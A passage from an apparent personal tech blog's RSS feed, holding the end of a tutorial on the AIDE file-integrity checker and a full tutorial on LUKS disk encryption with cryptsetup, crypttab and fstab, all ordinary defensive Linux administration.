</span></span><span class="line"><span class="cl"><span class="c1"># And then install it, if available.  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">yum</span> <span class="n">install</span> <span class="n">aide</span> <span class="o">-</span><span class="n">y</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GH5ZoirRAKBXJOdkSk4K2A.png" alt="aide-whatprovides-install"  />
</p>
<h3 id="next-step-">Next step ..??</h3>
<p>Let’s check the files unpacked from the <strong>aide package</strong> we just installed.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*WBBWo0dITSPIgjfNqPTrZA.png" alt="aide-rpm-ql"  />
</p>
<p>We found a configuration file — <code>/etc/aide.conf</code>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># open the file with vim or your favourite text editor  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">vim /etc/aide.conf  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># The file looked very huge so I checked its length.  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">wc /etc/aide.conf  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"># OUTPUT:  
</span></span><span class="line"><span class="cl"># 312 765 7333 /etc/aide.conf
</span></span></code></pre></div><p>Fortunately they have given a man page for the configurations settings.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">man 5 aide.conf
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*0HZv3rMcdAFMTbYiyPn_Xw.png" alt="aide.conf"  />
</p>
<p>This gives me a good news. There are only 3 types of line in the configuration file.</p>
<ul>
<li>There are the 1️⃣<em>configuration lines</em> which are used to <strong>set configuration parameters</strong> and <strong>define/undefine variables</strong>.</li>
<li>There are 2️⃣<em>selection lines</em> that are used to indicate <strong>which files are added</strong> to the database.</li>
<li>3️⃣ <em>macro lines</em> <strong>define or undefine variables</strong> within the config file.</li>
<li>Lines beginning with # are ignored as <strong>comments</strong>.#️⃣</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*LRp9V0giXu-oxaae.gif" alt="Really"  />
</p>
<p>You can now check the config file and things will make more sense to you. Also you can check the key-value pairs from <a href="https://linux.die.net/man/5/aide.conf">man page</a>.</p>
<h3 id="enough-for-configuration-how-to-use-it">Enough for configuration… How to use it?</h3>
<p>Go to the <a href="https://linux.die.net/man/1/aide">man page</a> of aide.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># from terminal  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">man aide
</span></span></code></pre></div><p>Again a reminder, and I quote.</p>
<blockquote>
<p>AIDE is an <strong>intrusion detection system</strong> for checking the <strong>integrity of files</strong>.</p>
</blockquote>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*gNw75QXgQiRPoxgopKvZSQ.png" alt="man-aide"  />
</p>
<p>One thing to notice here is <em><strong>DIAGNOSTICS</strong></em> (<em>Scroll down to bottom on the man page</em>).</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*m3ygM3U9O_-eooMR-3NJcA.png" alt="diagnostics"  />
</p>
<p>Another is, that AIDE can be controlled using few basic commands.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*nYCpUl-Pv4oHGnjbTsYXew.png" alt="commands"  />
</p>
<h3 id="time-for-some-fun-now">Time for some fun now!!</h3>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*eV9LiAtIIoAbbflD.gif" alt="lets-play"  />
</p>
<p><strong>Game-play</strong></p>
<ul>
<li>Create a folder and some files in it.</li>
<li>Configure AIDE to add that folder in database.</li>
<li>Have fun with the folder and files and check the AIDE logs for reports.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4RBSuCrL2W9C1Y9MspWl2w.png" alt="create-folder"  />
</p>
<p>Adding my new folder and files to aide.conf</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">#-------------- My-Settings ---------------  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">myfilter = sha256  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">/fun-with-aide myfilter
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*aC940c2LfvDHrQu_D4nKoA.png" alt="add-to-conf"  />
</p>
<p>This rule is a regular expression rule and will match the complete path of any file starting from /fun-with-aide, so this will include the files inside this folder.</p>
<p>Now some simple steps to follow:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">init</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">cp</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">new</span><span class="o">.</span><span class="n">gz</span> <span class="o">/</span><span class="k">var</span><span class="o">/</span><span class="n">lib</span><span class="o">/</span><span class="n">aide</span><span class="o">/</span><span class="n">aide</span><span class="o">.</span><span class="n">db</span><span class="o">.</span><span class="n">gz</span>
</span></span><span class="line"><span class="cl"><span class="o">*</span> <span class="n">aide</span> <span class="o">--</span><span class="n">check</span>
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*G7iCTRi0C6ttmWQe3-oxyA.png" alt="aide-check"  />
</p>
<p>What if we tinker with the file /fun-with-aide/file1?</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wDbGmR7vps5vsqs3i8_Icg.png" alt="tinker-file1"  />
</p>
<p>I have changed the content of the file1, due to which the sha256sum has also changed. This should be reported by <strong>aide</strong> in reports.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*z0Zq2wGpayGYo079V8bgUw.png" alt="aide-check"  />
</p>
<p>This generates a report that tells about the changes. I’ll get a count of <em>added files</em>, <em>removed files</em> and <em>changed files</em>, along with the name of those files and some detailed information.</p>
<hr>
<p>AIDE can be run manually if desired, but automation is the way nowadays.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*ip12LNV58018AQ8G.gif" alt="yeah-automation"  />
</p>
<p>Check the below provided simple cron job script to automatically check for the changes. For more complex examples check <a href="https://sources.gentoo.org/cgi-bin/viewvc.cgi/gentoo-x86/app-forensics/aide/files/aide.cron">this</a> and <a href="https://rfxn.com/downloads/cron.aide">this</a>.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># SOURCE: https://wiki.archlinux.org/index.php/AIDE  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash -e  </span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># these should be the same as what&#39;s defined in /etc/aide.conf  </span>
</span></span><span class="line"><span class="cl"><span class="nv">database</span><span class="o">=</span>/var/lib/aide/aide.db.gz  
</span></span><span class="line"><span class="cl">database<span class="se">\_</span>out<span class="o">=</span>/var/lib/aide/aide.db.new.gz  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="o">[</span> ! -f <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2">&#34;</span> <span class="o">]</span><span class="p">;</span> <span class="k">then</span>  
</span></span><span class="line"><span class="cl"> <span class="nb">echo</span> <span class="s2">&#34;</span><span class="nv">$database</span><span class="s2"> not found&#34;</span> &gt;<span class="p">&amp;</span><span class="m">2</span>  
</span></span><span class="line"><span class="cl"> <span class="nb">exit</span> <span class="m">1</span>  
</span></span><span class="line"><span class="cl"><span class="k">fi</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">aide -u <span class="o">||</span> <span class="nb">true</span>  
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span> <span class="nv">$database</span>.back  
</span></span><span class="line"><span class="cl">mv <span class="nv">$database</span><span class="se">\_</span>out <span class="nv">$database</span>
</span></span></code></pre></div><hr>
<p><strong>What about if attacker changed the database??</strong></p>
<p>When I checked the file type of the <em>aide.db.gz</em>&hellip; It came out to be a gzip compressed data, from Unix, max compression file.</p>
<p>This makes it very obvious to unzip this compressed file. I prefer using gunzip tool.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*rP1BY4TIP5OLCxQj4_GrGw.png" alt="operation-theatre"  />
</p>
<p>Specification of the db is also mentioned in the file.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FB264rJGlMj1Tr-4tPSWHg.png" alt="db_spec"  />
</p>
<p>Visualizing the above in a tabular manner.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*3MXSU4ub4fgXolHfPB34Qw.png" alt=""  />
</p>
<p><strong>You can add more filters and integrity checks to test other things as well.</strong></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*v87DoqZLe0Cq2K-f.gif" alt="being-tonystark"  />
</p>
<p>This whole db thing gives rise to a question. <strong>What if the attacker modifies the db??</strong></p>
<p>Hmmm.. then he wins🤷‍♂️. You have to keep your db secure from attackers. For this, you should keep your database in <strong>read-only mode</strong>. So that it can be only read and no modifications can be done to this. Also you can keep the DB in a different location like in a <strong>centralized server</strong> or in a <strong>removable media like pendrive</strong>. Or you can have it your way.</p>
<p>You can read more about <a href="https://wiki.gentoo.org/wiki/Integrity/Concepts">Integrity Concepts</a> here for better security guidelines.</p>
<h3 id="conclusion">Conclusion</h3>
<p>In the end, let’s understand how AIDE does what it does.</p>
<p>AIDE takes a “snapshot” of the state of the system, register hashes, modification times, and other data regarding the files defined by the administrator. This “snapshot” is used to build a database that is saved and may be stored on an external device for safekeeping.</p>
<p>When the administrator wants to run an integrity test, the administrator places the previously built database in an accessible place and commands AIDE to compare the database against the real status of the system. Should a change have happened to the computer between the snapshot creation and the test, AIDE will detect it and report it to the administrator. Alternatively, AIDE can be configured to run on a schedule and report changes daily using scheduling technologies such as cron.🔚</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*S_aFpI3KDiWfts2v.gif" alt="end"  />
</p>]]></content:encoded>
    </item>
    <item>
      <title>LUKS Disk Encryption</title>
      <link>https://ayedaemon.github.io/post/2020/12/luks-disk-encryption/</link>
      <pubDate>Sat, 19 Dec 2020 13:15:55 +0530</pubDate>
      <guid>https://ayedaemon.github.io/post/2020/12/luks-disk-encryption/</guid>
      <description>&lt;blockquote&gt;
&lt;p&gt;Linux Unified Key Encryption — Disk Encryption&lt;/p&gt;
&lt;/blockquote&gt;</description>
      <content:encoded><![CDATA[<blockquote>
<p>Linux Unified Key Encryption — Disk Encryption</p>
</blockquote>
<p><strong>cryptsetup</strong> — <em>manage plain dm-crypt and LUKS encrypted volumes</em></p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup &lt;OPTIONS&gt; &lt;action&gt; &lt;action-specific-options&gt; &lt;device&gt; &lt;dmname&gt;
</span></span></code></pre></div><p>An encrypted blockdevice is protected by a key. A key is either:</p>
<ul>
<li>a passphrase, or</li>
<li>a keyfile</li>
</ul>
<h3 id="what-the">What the..?</h3>
<p>Ok.. If you are new to encryption world, then it’s time to get a bit familiar data encryption.</p>
<p>There are 2 methods to encrypt your data:</p>
<ul>
<li><strong>Filesystem stacked level encryption</strong> : Form of disk encryption where individual files or directories are encrypted by the file system itself. <a href="https://en.wikipedia.org/wiki/Filesystem-level_encryption">read more here</a></li>
<li><strong>Block device level encryption</strong> : The entire partition or disk, in which the file system resides, is encrypted.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*bg4VTXG8Lp6jq9aC.gif" alt=""  />
</p>
<p>Before things go really technical and scary, let me show you how your data is stored in a harddisk.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*2cy1Ut_NVLQof_vTZWoLAQ.png" alt=""  />
</p>
<p>Above diagram shows how your data is stored in a harddisk.</p>
<ul>
<li>You create files (I am calling it data chunks) and insert your data in it.</li>
<li>These files are stored in a very systematic and managed system called <strong>File System</strong>.</li>
<li>Partitions are formatted to carry a file system on it.</li>
<li>Harddisks are divided into Partitions. (<a href="https://askleo.com/should_i_partition_my_hard_disk/">Wanna know why? — ask Leo!</a>)</li>
</ul>
<p>Now when you know how your data is exactly stored in a harddisk. Let’s see how a <strong>Block device level encryption</strong> works.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*2easqwhcymbcCSp6fHSZ6g.png" alt=""  />
</p>
<p>Here, a new layer is added in the usual thing.</p>
<ul>
<li>We attach a harddisk to our system.</li>
<li>Create partitions on it.</li>
<li>Encrypt the complete partition (make it password protected) 🔐</li>
<li>Create filesystem (NTFS, EXT4, XFS, etc) on the encrypted partition.</li>
<li>Write/save your data chunks.</li>
</ul>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*rcPPu_6o2rOgW2bS.gif" alt=""  />
</p>
<hr>
<h3 id="just-do-it-now-">Just Do It now ✔️</h3>
<h3 id="installing-required-tools">Installing required tools</h3>
<p>I am using a RHEL based OS which uses yum/dnf package managers.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">yum install cryptsetup -y
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">or
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">dnf install -y cryptsetup
</span></span></code></pre></div><h3 id="creating-the-partition">Creating the partition</h3>
<p><code>lsblk</code> - check the device name for the harddisk (sdb)</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*4c6x1UUNyksMWLCc-Yqyaw.png" alt=""  />
</p>
<p><code>fdisk</code> - partitioning tool</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*k_dPP7Hb4tGu7ARPeVLvOg.png" alt=""  />

<img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*LEOYgsQ-9juROPCikHX42g.png" alt=""  />
</p>
<h3 id="formating-with-luks">formating with luks</h3>
<p><code>cryptsetup -y -v luksFormat /dev/sdb1</code> - encrypt the partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*SETeIxieb0fOBPCuX7aHNg.png" alt=""  />
</p>
<p><code>lsblk -f</code> - check the encrypted partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*pBN1T2AcoQyo5B8FucJV2g.png" alt=""  />
</p>
<p><code>cryptsetup -v luksOpen /dev/sdb1 myencrypt</code> - map the encrypted partition to &lsquo;myencrypt&rsquo;.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*zcUCmHHyDkU9YpBL5Zg5ZQ.png" alt=""  />
</p>
<p><code>lsblk -f</code> - check it</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*5SKWOXd-lSX468LhgJNiZQ.png" alt=""  />
</p>
<h3 id="creating-a-file-system">creating a file system</h3>
<p><code>mkfs.xfs /dev/mapper/myencrypt</code> - create a file system on top of the encrypted partition.</p>
<p><code>lsblk -f</code> - Check the layering and filesystem associated.</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*ch_byQVfsZexQP7O7O7dag.png" alt=""  />
</p>
<h3 id="creating-a-mountpoint">creating a mountpoint</h3>
<p><code>mkdir -p /mnt/my_encrypted_backup mount -v /dev/mapper/myencrypt /mnt/my_encrypted_backup/</code></p>
<p><em>If you face such issues - SELinux lables blah blah blah</em></p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*GtzHhCp6CPR8YWBTOz-yqQ.png" alt=""  />
</p>
<p><em>Type this on magic terminal —</em> <em>restorecon -vvRF /mnt/my_encrypted_backup/</em> <em>- This will restore the SELinux context back to defaults for the destination directory.</em></p>
<h3 id="checking-luks-dumps">Checking luks dumps</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksDump /dev/sdb1
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*tWyJ8XLcwJuyRG-aUl8BZA.png" alt=""  />
</p>
<h3 id="adding-new-key">Adding new key</h3>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">mkdir /etc/luks-keys/; dd if=/dev/random of=/etc/luks-keys/mybackup\_key bs=32 count=1
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*fE51gnVtgYGkSOeASgrzfQ.png" alt=""  />
</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup luksAddKey /dev/sdb1 /etc/luks-keys/mybackup\_key
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*FBkoDsoqSHZ9AWw73ICg2Q.png" alt=""  />
</p>
<p>Checking the dumps again</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*7pWmoHcrHZmLXtGISkrCZQ.png" alt=""  />
</p>
<p>Now here are 2 slots available.</p>
<ul>
<li>one with the initial key I entered at the time of setting it up.</li>
<li>another, just in the above step.</li>
</ul>
<h4 id="at-this-particular-moment-there-are-few-questions-in-my-mind">At this particular moment, there are few questions in my mind.</h4>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/0*-Pngs8QCzMnlwKVv.gif" alt=""  />
</p>
<p>You should know them too.</p>
<ol>
<li>If you want to unmount and remove the harddisk. You’ll have to follow the steps:</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">umount /mountpoints/sdb cryptsetup luksClose myencrypt
</span></span></code></pre></div><p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*6JplORU1iMFii5fwR4Reqg.png" alt=""  />

<img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*TZ8IkBpyRwkufkvyPkIT2g.png" alt=""  />
</p>
<ol start="2">
<li>If you want to open the luks partition with keyfile instead of the passphrase.</li>
</ol>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">cryptsetup -v luksOpen /dev/sdb1 myencrypt --key-file=/etc/luks-keys/mybackup\_key
</span></span></code></pre></div><ol start="3">
<li>What if someone changes the content of the keyfile?</li>
</ol>
<p>Creating a new key</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*SuPXbF7MvbIufvP8qAikTw.png" alt=""  />
</p>
<p>Add the key to the slots</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*gJ41bDkh1J5UyNGIQjZJww.png" alt=""  />
</p>
<p>Use key</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*bykTB3_3rLa3w5AODyKA-w.png" alt=""  />
</p>
<p>So the content inside the keyfile do matter; You can’t change it and expect things to work just fine for you.</p>
<h3 id="time-for-some-automation">Time for some Automation</h3>
<p>Get the UUID of the encrypted partition</p>
<p><img loading="lazy" src="https://cdn-images-1.medium.com/max/800/1*wasZr_6cKCRIibLohoPJvQ.png" alt=""  />
</p>
<p>And make the below entry in <code>/etc/crypttab</code> file. (Check the UUID for your device - Don&rsquo;t copy mine!!)</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">myencrypt    UUID=48a20857-6f26-4352-89d5-e778f2d98950     /etc/luks-keys/mybackup\_key    luks
</span></span></code></pre></div><p>The above line is a combination of 4 fields:</p>
<ul>
<li>name of the mapped device.</li>
<li>uuid of the encrypted partition</li>
<li>keyfile to unlock the partiotion</li>
<li>type of encryption used — luks</li>
</ul>
<p>And then make below entry in <code>/etc/fstab</code> file.</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">/dev/mapper/myencrypt /mountpoints/sdb xfs defaults 0 0
</span></span></code></pre></div><p><em>Want to learn more about</em> <a href="https://linux.die.net/man/5/crypttab"><em>crypttab</em></a> <em>and</em> <a href="https://linux.die.net/man/5/fstab"><em>fstab</em></a></p>
<p>Last step to verify if the above steps worked fine or not.</p>
<ul>
<li>Remount and verify (using mount command with &lsquo;a&rsquo; and &lsquo;v&rsquo; flags for clarity)</li>
<li>Reboot the system and check if everything works after reboot. (Trust me, things betray sometimes after reboot)</li>
</ul>
<hr>
<p>Want to <a href="https://wiki.archlinux.org/index.php/Dm-crypt/Device_encryption">read more</a> about dm-crypt or device encryption?</p>
<hr>
<p><img loading="lazy" src="https://miro.medium.com/max/480/0*IZmFYignS8jVnoSE.gif" alt=""  />
</p>]]></content:encoded>
    </item>
  </channel>
</rss>
